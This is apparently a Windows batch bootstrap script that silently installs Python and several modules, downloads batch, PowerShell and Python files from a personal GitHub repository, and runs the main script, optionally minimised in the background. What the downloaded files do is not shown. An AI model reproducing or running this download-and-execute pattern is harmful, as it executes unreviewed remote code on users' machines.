@echo off
setlocal enabledelayedexpansion

set "PYTHON_VERSION=3.14.3"
set "PIP_VERSION=26.0.1"

python --version >nul 2>&1
if errorlevel 1 goto install_python

for /f "tokens=2 delims= " %%v in ('python --version 2^>^&1') do set "INSTALLED_PY=%%v"

if "!INSTALLED_PY!"=="%PYTHON_VERSION%" (
    echo Python OK
    goto check_pip
) else (
    echo Installing correct Python version
    goto install_python
)

:install_python
set "PYTHON_INSTALLER=python-%PYTHON_VERSION%-amd64.exe"
set "PYTHON_URL=https://www.python.org/ftp/python/%PYTHON_VERSION%/%PYTHON_INSTALLER%"

powershell -Command "Invoke-WebRequest -Uri '%PYTHON_URL%' -OutFile '%PYTHON_INSTALLER%'"
start /wait "" "%PYTHON_INSTALLER%" /quiet InstallAllUsers=1 PrependPath=1 Include_pip=1

goto check_pip

:check_pip
python -m pip --version >nul 2>&1
if errorlevel 1 goto install_pip

for /f "tokens=2" %%v in ('python -m pip --version') do set "INSTALLED_PIP=%%v"

if "!INSTALLED_PIP!"=="%PIP_VERSION%" (
    goto python_inst
) else (
    echo Updating pip
    goto install_pip
)

:install_pip
python -m ensurepip
python -m pip install --upgrade pip==%PIP_VERSION%
goto python_inst

:python_inst
call :install_if_missing requests
call :install_if_missing cryptography
call :install_if_missing XNOR_module
call :install_file "postdata.bat" "%~dp0" "https://raw.githubusercontent.com/BOBZERO-afk/gitfubby-in-here/refs/heads/main/postdata.bat"
call :install_file "pissman.ps1" "%~dp0" "https://raw.githubusercontent.com/BOBZERO-afk/gitfubby-in-here/refs/heads/main/pissman.ps1"
call :install_file "pissman_25.bat" "%~dp0" "https://raw.githubusercontent.com/BOBZERO-afk/gitfubby-in-here/refs/heads/main/pissman_25.bat"
call :install_file "pissman_25_main.py" "%~dp0" "https://raw.githubusercontent.com/BOBZERO-afk/gitfubby-in-here/refs/heads/main/pissman_25_main.py"
call :install_file "pissman_25_GUI.py" "%~dp0" "https://raw.githubusercontent.com/BOBZERO-afk/gitfubby-in-here/refs/heads/main/pissman_25_GUI.py"

echo Starting main...
python pissman_25_main.py start

set /p R="Did it work? (Y/N): "
if /I "%R%"=="Y" (
    start "" cmd /min /c "python pissman_25_main.py start"
)

exit /b

:install_if_missing
set "MODULE=%~1"
python -c "import %MODULE%" >nul 2>&1
if errorlevel 1 (
    echo Installing %MODULE%
    python -m pip install %MODULE%
)
exit /b

:install_file
set "file=%~1"
set "location=%~2"
set "url=%~3"

if not exist "%location%%file%" (
    echo Downloading %file%
    powershell -Command "Invoke-WebRequest -Uri '%url%' -OutFile '%location%%file%'"
)
exit /b
